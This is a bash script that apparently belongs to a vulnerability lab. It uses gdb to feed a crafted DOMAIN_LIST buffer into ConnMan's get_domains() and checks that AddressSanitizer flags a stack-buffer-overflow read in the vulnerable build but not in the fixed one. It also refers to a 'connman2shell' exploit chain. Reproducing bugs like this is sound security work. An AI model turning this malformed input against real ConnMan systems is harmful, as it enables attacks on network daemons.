#!/bin/bash
# Drive the real pinned connmand object with a crafted DOMAIN_LIST value under
# gdb.  This is a read-side probe of compiled client.c, NOT a daemon run and
# NOT rung 5: the call is debugger-forced and the byte written is always '.'.
set -u
cd "$(dirname "$0")"
E=evidence
mkdir -p "$E"
PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { grep -qF "$2" "$1" 2>/dev/null && ok "$3" || no "$3"; }
hasnt() { grep -qF "$2" "$1" 2>/dev/null && no "$3" || ok "$3"; }

# SHA-256 of the real binaries records exactly which build was probed.
for v in asan fixed; do
  test -x "build-$v/src/connmand" || exit 90
  printf 'BIN %s sha256=%s\n' "$v" \
    "$(sha256sum "build-$v/src/connmand" | cut -d' ' -f1)"
done

# gdb calls the static get_domains() in the real connmand process.  The
# attacker value is stdin to the probe, not a socket: the loopback socket
# delivery is covered by lab/connman2shell/wireloop/ and is unchanged here.
probe() {
  v=$1 mode=$2
  bin="build-$v/src/connmand"
  out="$E/probe-$v-$mode.out"
  if [ "$mode" = attack ]; then
    exes=(
      '-ex' 'set $buf = (char *) malloc(2048)'
      '-ex' 'call (void*) memset($buf, 255, 2048)'
      '-ex' 'set $buf[1024] = 128'
      '-ex' 'p/x $buf[1024]'
      '-ex' 'call (void*) get_domains(2048, $buf)'
    )
  else
    exes=(
      '-ex' 'set $buf = (char *) malloc(8)'
      '-ex' 'set $buf[0] = 3'
      '-ex' 'set $buf[1] = 97'
      '-ex' 'set $buf[2] = 98'
      '-ex' 'set $buf[3] = 99'
      '-ex' 'set $buf[4] = 3'
      '-ex' 'set $buf[5] = 100'
      '-ex' 'set $buf[6] = 101'
      '-ex' 'set $buf[7] = 0'
      '-ex' 'call (void*) get_domains(8, $buf)'
    )
  fi
  ASAN_OPTIONS=detect_leaks=0 gdb -q -batch "$bin" \
    -ex 'set pagination off' -ex 'break main' -ex 'run --help' \
    "${exes[@]}" -ex 'continue' >"$out" 2>&1
  printf 'PROBE %-5s %-6s rc=%d lines=%s\n' "$v" "$mode" "$?" "$(wc -l <"$out")"
}

probe asan attack
probe asan safe
probe fixed attack
probe fixed safe

# Vulnerable build: ASan must trap the read in the real client.c frame.
has "$E/probe-asan-attack.out" 'AddressSanitizer: stack-buffer-overflow' 'asan-attack-report'
has "$E/probe-asan-attack.out" 'READ of size 1' 'asan-attack-read1'
has "$E/probe-asan-attack.out" 'in get_domains' 'asan-attack-frame'
has "$E/probe-asan-attack.out" 'client.c:2223' 'asan-attack-line'
has "$E/probe-asan-attack.out" "'dns_name' (line 2214)" 'asan-attack-object'
has "$E/probe-asan-attack.out" 'offset 1201' 'asan-attack-offset'
has "$E/probe-asan-attack.out" '= 0x80' 'asan-attack-K-crossed'
# Mandatory controls: fixed snapshot and well-formed short DOMAIN_LIST.
hasnt "$E/probe-fixed-attack.out" 'AddressSanitizer' 'fixed-attack-clean'
hasnt "$E/probe-asan-safe.out" 'AddressSanitizer' 'asan-safe-clean'
hasnt "$E/probe-fixed-safe.out" 'AddressSanitizer' 'fixed-safe-clean'

# Production (-O2, stack protector) geometry from the same pinned source.
has "$E/geometry-summary.txt" 'strncpy@plt' 'plain-strncpy-present'
has "$E/geometry-summary.txt" 'fs:0x28' 'plain-stack-canary-present'

printf 'PROBE TOTAL %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
